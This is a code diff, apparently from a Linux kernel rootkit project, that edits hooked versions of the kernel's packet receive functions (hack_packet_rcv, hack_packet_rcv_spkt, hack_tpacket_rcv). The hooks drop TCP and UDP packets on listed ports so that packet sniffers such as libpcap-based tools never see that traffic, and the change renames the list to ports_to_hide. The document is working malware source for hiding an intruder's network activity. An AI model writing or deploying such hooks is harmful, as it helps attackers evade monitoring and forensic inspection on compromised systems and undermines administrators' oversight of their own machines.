@@ -92,6 +92,7 @@ libpcap opens a socket which uses packet_create function that hooks packet_rcv t
 the packet then is passed to the hooked function.
 uses packet_rcv_spkt, if the recieve packet is not empty, uses tpacket_rcv)*/
 //! CAN ADD SOURCE/DEST ADDRESS FILTER
+//! port can accidently hide traffic that is not meant to be hidden(can add address filter) 
 static int hack_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev){
 	struct iphdr *iph;
 	struct udphdr *udph;
@@ -105,7 +106,7 @@ static int hack_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct p
 		udph = udp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(udph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(udph->source));
-		if (find_node(&ports_to_drop, source_port) == 0 || find_node(&ports_to_drop, dest_port) == 0){
+		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
 			return NF_DROP;
 		}
 	}
@@ -113,7 +114,7 @@ static int hack_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct p
 		tcph = tcp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(tcph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(tcph->source));
-		if (find_node(&ports_to_drop, source_port) == 0 || find_node(&ports_to_drop, dest_port) == 0){
+		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
 			return NF_DROP;
 		}
 	}
@@ -135,15 +136,15 @@ static int hack_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, str
 		udph = udp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(udph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(udph->source));
-		if (find_node(&ports_to_drop, source_port) == 0 || find_node(&ports_to_drop, dest_port) == 0){
-			return NF_DROP;
+		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
+			return NF_DROP; 
 		}
 	}
 	else if (iph->protocol == IPPROTO_TCP) {
 		tcph = tcp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(tcph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(tcph->source));
-		if (find_node(&ports_to_drop, source_port) == 0 || find_node(&ports_to_drop, dest_port) == 0){
+		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
 			return NF_DROP;
 		}
 	}
@@ -165,7 +166,7 @@ static int hack_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct 
 		udph = udp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(udph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(udph->source));
-		if (find_node(&ports_to_drop, source_port) == 0 || find_node(&ports_to_drop, dest_port) == 0){
+		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
 			return NF_DROP;
 		}
 	}
@@ -173,7 +174,7 @@ static int hack_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct 
 		tcph = tcp_hdr(skb);
 		snprintf(dest_port, 6, "%hu", ntohs(tcph->dest));
 		snprintf(source_port, 6, "%hu", ntohs(tcph->source));
-		if (find_node(&ports_to_drop, source_port) == 0 || find_node(&ports_to_drop, dest_port) == 0){
+		if (find_node(&ports_to_hide, source_port) == 0 || find_node(&ports_to_hide, dest_port) == 0){
 			return NF_DROP;
 		}
 	}
